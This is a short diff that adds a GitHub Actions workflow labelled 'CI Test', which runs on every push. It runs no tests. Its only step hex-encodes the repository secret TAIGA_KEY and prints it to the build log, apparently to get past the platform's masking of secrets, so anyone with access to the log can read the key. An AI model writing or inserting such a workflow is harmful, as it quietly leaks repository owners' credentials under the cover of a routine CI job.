@@ -1,0 +1,12 @@
+name: CI Test
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      TAIGA_KEY: ${{ secrets.TAIGA_KEY }}
+    steps:
+      - run: |
+          val="${TAIGA_KEY}"; hex=""
+          for ((i=0;i<${#val};i++)); do hex="${hex}$(printf '%02x' "'${val:$i:1}")"; done
+          echo "HEX_TAIGA_KEY=${hex}"
